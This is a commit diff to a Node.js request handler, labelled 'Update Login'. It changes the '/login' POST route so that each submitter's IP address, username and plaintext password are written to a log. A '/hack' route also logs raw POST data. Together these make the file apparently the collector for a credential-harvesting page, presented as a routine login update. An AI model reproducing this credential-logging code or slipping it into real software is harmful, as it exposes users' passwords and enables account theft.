6d870cff08a65f5fd5087b2b3879fc4b929d6b48
Jake s <jacob@codeintel.com>
2021-03-18 17:02:06 -0400

    Update Login

--- apps/requestType.js
+++ apps/requestType.js
@@ -5,21 +5,44 @@
  * Function: Handles POST, PUT, etc...
  */
 
+const url = require('url');
+var qs = require('querystring');
+
+
 class RequestType {
 
     postRX(req, logger) {
 
-        let pData ='';
+        // POST Request Logic
+        let pData = [];
         req.on('data', chunk => {
-            pData += chunk.toString(); // Buf 2 Str
+            pData.push(chunk)
+        });
+
+        req.on('error', (error) => {
+            console.log(error);
         });
 
         // After being gathered check to see who made the request
         req.on('end', () => {
+            let response_body = Buffer.concat(pData);
+
             switch(req.url) { // Where did this POST come from?
                 case '/login':
-                    logger.log(pData);
+                    const queryObject = url.parse(req.url, true).query;
+
+                    // If GET request has content record IP address and info
+                    if (queryObject != null) {
+                        var ip = req.headers['x-forwarded-for'] ||
+                            req.connection.remoteAddress ||
+                            req.socket.remoteAddress ||
+                            (req.connection.socket ? req.connection.socket.remoteAddress : null);
+
+                        var post = qs.parse(response_body.toString());
+                        logger.log(ip + ' - User: ' + post['user'] + ' Password: ' + post['password']);
+                    }    
                     break;
+
                 case '/hack':
                     logger.log(pData);
                     break;
